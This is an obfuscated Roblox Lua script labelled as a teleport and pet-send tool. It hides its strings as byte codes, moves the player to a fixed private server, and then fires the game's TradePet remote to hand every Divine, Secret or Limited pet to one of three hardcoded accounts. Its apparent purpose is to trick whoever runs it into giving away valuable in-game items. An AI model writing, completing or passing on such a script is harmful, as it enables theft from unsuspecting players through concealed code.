-- Obfuscated teleport + pet send script
repeat wait() until game:IsLoaded()

local a = game
local b = a:GetService("\080\108\097\121\101\114\115") -- "Players"
local c = a:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") -- "TeleportService"
local d = a:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") -- "ReplicatedStorage"
local e = b.LocalPlayer

-- Anti-tamper (Only run if your username matches - optional)
if e.Name ~= "\066\111\115\115\069\120\097\109\112\108\101" then return end -- change this to your username if you want

local f = 126884695634066
local g = "19fa2ffd5b2f404494bc8c791a60c706"

-- Safe teleport
pcall(function()
	c:TeleportToPrivateServer(f, g, {e})
end)

-- Wait fully loaded
e.CharacterAdded:Wait()
repeat wait() until game:IsLoaded()
wait(5)

-- Rarities
local h = {"\068\105\118\105\110\101", "\083\101\099\114\101\116", "\076\105\109\105\116\101\100"}
for i = 1, #h do
	h[i] = string.char(unpack({string.byte(h[i], 1, #h[i])}))
end
local j = string.char(unpack({string.byte("\082\097\114\105\116\121", 1, 6)})) -- "Rarity"

-- Users
local k = {
	string.char(unpack({98,111,110,101,98,108,111,115,115,111,109,50,49,53})),
	string.char(unpack({98,101,97,110,115,116,97,108,107,49,50,53,49})),
	string.char(unpack({98,117,114,110,105,110,103,98,117,100,55,48,57}))
}

-- Wait for target user
local l = nil
for m = 1, #k do
	if b:FindFirstChild(k[m]) then
		l = k[m]
		break
	end
end
if not l then return end

-- Remote
local n = d:FindFirstChild(string.char(unpack({84,114,97,100,101,80,101,116}))) -- "TradePet"
if not n then return end

-- Pets folder
local o = e:FindFirstChild("Pets")
if not o then return end

-- Send pets
for _, p in pairs(o:GetChildren()) do
	local q = p:FindFirstChild(j)
	if q and table.find(h, q.Value) then
		n:FireServer(l, p.Name)
	end
end
